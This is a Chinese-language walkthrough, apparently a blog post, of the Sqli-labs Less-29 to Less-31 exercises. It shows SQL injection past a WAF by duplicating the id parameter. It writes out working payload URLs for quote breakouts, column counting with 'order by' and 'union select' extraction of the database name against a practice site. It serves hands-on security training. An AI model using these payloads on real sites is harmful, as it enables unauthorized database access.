**查找注入点**<br />http://www.web.com/sql/Less-29/login.php?id=1'<br />此时报错<br />![](https://img-blog.csdnimg.cn/2020072315331289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=ZpEEy&originHeight=625&originWidth=731&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**把你这个愚蠢的黑客赶走<br />WAF成功阻挡攻击**

**说明此时我们的参数被WAF阻挡，此时我们加入第二个参数**<br />http://www.web.com/sql/Less-29/login.php?id=1&id=1'<br />报错<br />![](https://img-blog.csdnimg.cn/20200723154158412.png#crop=0&crop=0&crop=1&crop=1&id=Pnt6x&originHeight=46&originWidth=1218&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**进行注释，成功，说明存在注入**<br />http://www.web.com/sql/Less-29/login.php?id=1&id=1'--+<br />![](https://img-blog.csdnimg.cn/20200723154228686.png#crop=0&crop=0&crop=1&crop=1&id=QUug4&originHeight=142&originWidth=436&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看列数**<br />http://www.web.com/sql/Less-29/login.php?id=1&id=1' order by 3--+<br />当为4时报错，为3返回正确，说明有3列<br />![](https://img-blog.csdnimg.cn/20200723154406982.png#crop=0&crop=0&crop=1&crop=1&id=KvRoe&originHeight=161&originWidth=418&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />http://www.web.com/sql/Less-29/login.php?id=1&id=-1' union select 1,2,database()--+<br />![](https://img-blog.csdnimg.cn/20200723154503375.png#crop=0&crop=0&crop=1&crop=1&id=eTspA&originHeight=154&originWidth=433&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以下步骤与Sqli-labs-Less-1相同，不进行详细叙述**


# Sqli-labs-Less-30 
![](https://img-blog.csdnimg.cn/20200723155904332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=t3P4D&originHeight=357&originWidth=1142&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

与Sqli-labs-Less-29 一样，也是属于WAF的练习<br />使用http://www.web.com/sql/Less-30/login.php

**判断注入点**<br />http://www.web.com/sql/Less-30/login.php?id=1'<br />报错<br />![](https://img-blog.csdnimg.cn/20200723155243802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=BZkxd&originHeight=606&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**说明此时我们的参数被WAF阻挡，此时我们加入第二个参数**<br />http://www.web.com/sql/Less-30/login.php?id=1&id=1'<br />登录成功，不存在注入<br />http://www.web.com/sql/Less-30/login.php?id=1&id=1"<br />报错，进行注释后登录成功，说明存在注入点<br />http://www.web.com/sql/Less-30/login.php?id=1&id=1"--+<br />![](https://img-blog.csdnimg.cn/20200723155422621.png#crop=0&crop=0&crop=1&crop=1&id=Jd1z6&originHeight=155&originWidth=439&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看列数**<br />http://www.web.com/sql/Less-30/login.php?id=1&id=1" order by 3--+<br />当为4时报错，为3返回正确，说明有3列<br />![](https://img-blog.csdnimg.cn/20200723155547456.png#crop=0&crop=0&crop=1&crop=1&id=sd43O&originHeight=43&originWidth=332&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />http://www.web.com/sql/Less-30/login.php?id=1&id=-1" union select 1,2,database()--+<br />![](https://img-blog.csdnimg.cn/20200723155625929.png#crop=0&crop=0&crop=1&crop=1&id=Oesu3&originHeight=197&originWidth=549&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以下步骤与Sqli-labs-Less-1相同，不进行详细叙述**


# Sqli-labs-Less-31
![](https://img-blog.csdnimg.cn/20200723160039439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=PGXgf&originHeight=345&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
与Sqli-labs-Less-29 一样，也是属于WAF的练习<br />使用http://www.web.com/sql/Less-31/login.php

**判断注入点**<br />http://www.web.com/sql/Less-31/login.php?id=1'<br />报错<br />![](https://img-blog.csdnimg.cn/20200723160134970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=woqX2&originHeight=622&originWidth=810&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**说明此时我们的参数被WAF阻挡，此时我们加入第二个参数**<br />http://www.web.com/sql/Less-31/login.php?id=1&id=1'<br />登录成功，不存在注入<br />http://www.web.com/sql/Less-31/login.php?id=1&id=1"<br />报错，并显示少了一个),加上)后进行注释后登录成功，说明存在注入点<br />![](https://img-blog.csdnimg.cn/2020072316035038.png#crop=0&crop=0&crop=1&crop=1&id=LvtGi&originHeight=50&originWidth=1262&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-31/login.php?id=1&id=1")--+<br />![](https://img-blog.csdnimg.cn/20200723160400968.png#crop=0&crop=0&crop=1&crop=1&id=ghtYQ&originHeight=157&originWidth=437&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看列数**<br />http://www.web.com/sql/Less-31/login.php?id=1&id=1") order by 3--+<br />当为4时报错，为3返回正确，说明有3列<br />![](https://img-blog.csdnimg.cn/20200723160501425.png#crop=0&crop=0&crop=1&crop=1&id=VGMys&originHeight=85&originWidth=406&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />http://www.web.com/sql/Less-31/login.php?id=1&id=-1") union select 1,2,database()--+<br />![](https://img-blog.csdnimg.cn/20200723160515572.png#crop=0&crop=0&crop=1&crop=1&id=odjfo&originHeight=168&originWidth=451&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以下步骤与Sqli-labs-Less-4相同，不进行详细叙述**



